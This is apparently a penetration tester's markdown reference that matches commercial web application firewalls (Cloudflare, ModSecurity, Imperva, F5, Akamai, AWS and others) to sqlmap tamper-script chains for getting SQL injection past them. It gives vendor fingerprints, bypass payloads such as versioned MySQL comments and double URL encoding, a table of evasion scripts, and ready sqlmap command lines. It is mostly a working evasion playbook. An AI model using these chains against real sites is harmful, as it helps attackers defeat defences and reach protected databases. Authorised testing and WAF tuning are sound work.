# WAF Tamper Script Matrix

> Comprehensive mapping of WAF vendors to effective tamper scripts.
> Tested combinations based on community research and real-world engagements.

---

## Quick Reference Table

| WAF | Primary Tampers | Secondary | Notes |
|-----|----------------|-----------|-------|
| Cloudflare | `space2comment,randomcase,charencode` | `between,chardoubleencode` | Most effective with delay |
| ModSecurity CRS | `modsecurityzeroversioned,space2comment` | `randomcase,between` | MySQL-specific first tamper |
| Imperva Incapsula | `space2comment,randomcase,between,greatest` | `charencode,apostrophemask` | Needs operator substitution |
| F5 BIG-IP ASM | `randomcase,charencode,space2randomblank` | `between,equaltolike` | |
| Akamai | `between,chardoubleencode,randomcase` | `space2comment` | Double encoding effective |
| Sucuri | `space2comment,randomcase` | `charencode` | Often simple bypass |
| Barracuda | `percentage,randomcase,space2comment` | `charencode` | Percentage trick works |
| AWS WAF | `charencode,randomcase,between` | `space2comment` | Varies by ruleset |
| Fortinet FortiWeb | `space2comment,randomcase` | `charencode` | |
| Citrix NetScaler | `space2comment,between` | `randomcase` | |
| Generic/Unknown | `space2comment,randomcase` | `between,charencode` | Universal start |

---

## Detailed WAF Profiles

### Cloudflare

**Detection:** `Server: cloudflare`, `CF-RAY` header, "cloudflare" in error body

**Effective Tamper Chains:**
```bash
# Level 1 (start here)
--tamper=space2comment,randomcase

# Level 2 (if level 1 blocked)
--tamper=space2comment,randomcase,charencode

# Level 3 (heavy evasion)
--tamper=space2comment,randomcase,chardoubleencode,between
```

**Additional Flags:**
```bash
--random-agent --delay=2 --threads=2
```

**Known Signatures Cloudflare Catches:**
- Unencoded keywords: UNION, SELECT, INSERT, DROP
- Unencoded operators: OR, AND
- Classic error payloads: `'` + arithmetic

**Bypass Notes:**
- Cloudflare uses ML-based detection in addition to signatures
- High-risk payloads (data modification) blocked more aggressively
- Use `--level=2 --risk=1` to avoid triggering ML rules

---

### ModSecurity (OWASP CRS)

**Detection:** HTTP 403 + "Mod_Security" or "NAXSI" in body

**Effective Tamper Chains:**
```bash
# MySQL target (most common with ModSec)
--tamper=modsecurityzeroversioned,space2comment,randomcase

# Generic (non-MySQL)
--tamper=space2comment,randomcase,between

# Maximum evasion
--tamper=modsecurityzeroversioned,versionedkeywords,space2comment,randomcase,charencode
```

**Key Bypass Technique - Versioned Comments:**
ModSecurity often blocks `SELECT` but misses MySQL's versioned syntax:
```sql
-- Blocked: SELECT * FROM users
-- Bypass: /*!50000SELECT*/ * /*!50000FROM*/ users
-- Zero version: /*!00000SELECT*/ * /*!00000FROM*/ users
```

**CRS Rule Bypass Notes:**
- CRS Rule 942100: SQL Injection Attack Detected via libinjection
- CRS Rule 942190: SQL Injection - SQL Tautology
- Versioned comments bypass most CRS rules for MySQL

---

### Imperva Incapsula

**Detection:** `X-Cdn: Incapsula` header, "Incapsula incident ID" in body

**Effective Tamper Chains:**
```bash
# Level 1
--tamper=space2comment,randomcase

# Level 2
--tamper=space2comment,randomcase,between,greatest

# Level 3
--tamper=space2comment,randomcase,between,greatest,charencode,apostrophemask
```

**Key Bypass Techniques:**
- Replace comparison operators (Imperva detects `>`, `=`, `<`)
- Use `GREATEST()` instead of `>`: `GREATEST(a,b)=b` vs `a<=b`
- Use `BETWEEN` instead of comparison: `NOT BETWEEN 0 AND 99`

---

### F5 BIG-IP ASM

**Detection:** `X-WA-Info` header, "The requested URL was rejected" in body

**Effective Tamper Chains:**
```bash
--tamper=randomcase,charencode,space2randomblank

# Alternative
--tamper=randomcase,charencode,between,equaltolike
```

---

### Akamai WAF

**Detection:** `AkamaiGHost` header, "Reference #" in error body

**Effective Tamper Chains:**
```bash
# Double encoding is key for Akamai
--tamper=between,chardoubleencode,randomcase,space2comment
```

**Key Bypass:** Akamai often only decodes once. Double URL encoding bypasses inspection.

---

### AWS WAF

**Detection:** `x-amzn-RequestId` header, 403 from AWS ALB

**Effective Tamper Chains:**
```bash
--tamper=charencode,randomcase,between,space2comment
```

**Note:** AWS WAF is highly configurable. Bypass effectiveness depends on customer ruleset.

---

## Tamper Script Quick Reference

| Script Name | What It Does | DBMS | Bypasses |
|------------|--------------|------|----------|
| `apostrophemask` | `'` → UTF-8 full-width `'` | All | Quote filters |
| `apostrophenullencode` | `'` → `%00%27` | All | Quote filters |
| `appendnullbyte` | Append `%00` | Generic | Some legacy WAFs |
| `base64encode` | Base64 entire payload | All | Pattern matching |
| `between` | `>` → `NOT BETWEEN 0 AND` | All | Operator filters |
| `bluecoat` | Replace spaces with `%09` | MySQL | Blue Coat proxy |
| `chardoubleencode` | Double URL encode | All | Single-decode WAFs |
| `charencode` | URL encode all chars | All | URL filters |
| `charunicodeencode` | Unicode encode | MSSQL/MySQL | Unicode-unaware WAFs |
| `commentbeforeparentheses` | `/**/` before `(` | All | Parenthesis rules |
| `concat2concatws` | `CONCAT` → `CONCAT_WS` | MySQL | MySQL function filters |
| `dunno` | Various tricks | MySQL | |
| `equaltolike` | `=` → `LIKE` | All | Equals filters |
| `escapequotes` | Escape quotes | All | Quote filters |
| `greatest` | `>` → `GREATEST()` | MySQL | Greater-than filters |
| `halfversionedmorekeywords` | `/*!0SELECT*/` | MySQL | ModSecurity |
| `htmlencode` | HTML entity encode | All | HTML-decoded WAFs |
| `ifnull2ifisnull` | `IFNULL` → `IF(ISNULL` | MySQL | IFNULL filters |
| `ifnull2nullif` | `IFNULL` → `NULLIF` | MySQL, Oracle | |
| `least` | `<` → `LEAST()` | MySQL | Less-than filters |
| `luanginx` | LUA nginx bypass | All | LUA-based WAF |
| `modsecurityversioned` | `/*!SELECT*/` | MySQL | ModSecurity |
| `modsecurityzeroversioned` | `/*!00000SELECT*/` | MySQL | ModSecurity CRS |
| `multiplespaces` | Multiple spaces | All | Single-space rules |
| `nonrecursivereplacement` | Non-recursive replace | All | Simple string replace |
| `overlongutf8` | Overlong UTF-8 | All | UTF-8 WAFs |
| `overlongutf8more` | More overlong UTF-8 | All | |
| `percentage` | `S%ELECT` | MSSQL | URL decode bypass |
| `plus2concat` | `+` → `CONCAT()` | MySQL | Plus filter |
| `plus2fnconcat` | `+` → `CONCAT()` alt | MySQL | |
| `randomcase` | Random case letters | All | Case-sensitive rules |
| `randomcomments` | Random `/**/` | MySQL | Pattern rules |
| `securesphere` | SecureSphere bypass | All | SecureSphere |
| `space2comment` | Space → `/**/` | All | Space filters |
| `space2dash` | Space → `--\n` | All | Space filters |
| `space2hash` | Space → `#\n` | MySQL | |
| `space2mssqlblank` | Space → blank variants | MSSQL | MSSQL space filters |
| `space2mssqlhash` | Space → `#\n` | MSSQL | |
| `space2mysqlblank` | Space → MySQL blanks | MySQL | MySQL space filters |
| `space2mysqldash` | Space → MySQL dash | MySQL | |
| `space2plus` | Space → `+` | All | |
| `space2randomblank` | Space → random blank | All | Space filters |
| `symboliclogical` | `AND`/`OR` → `&&`/`\|\|` | MySQL | Keyword filters |
| `unionalltounion` | `UNION ALL` → `UNION` | All | ALL keyword filter |
| `unmagicquotes` | Escape magic quotes | All | GPC magic quotes |
| `uppercase` | Uppercase keywords | All | Lowercase filters |
| `versionedkeywords` | `/*!SELECT*/` | MySQL | ModSecurity |
| `versionedmorekeywords` | More versioned | MySQL | ModSecurity |
| `xforwardedfor` | Fake X-Forwarded-For | All | IP whitelist |

---

## Testing New WAF Bypasses

```bash
# Step 1: Identify what the WAF blocks
# Inject simple payloads, increase complexity

# Step 2: Test tampers one at a time
sqlmap -u "TARGET" --tamper=space2comment -v 5 --technique=E --batch

# Step 3: Check payload in verbose output
# Look for "modified payload:" lines

# Step 4: Chain effective tampers
sqlmap -u "TARGET" --tamper=space2comment,randomcase -v 3 --batch
```
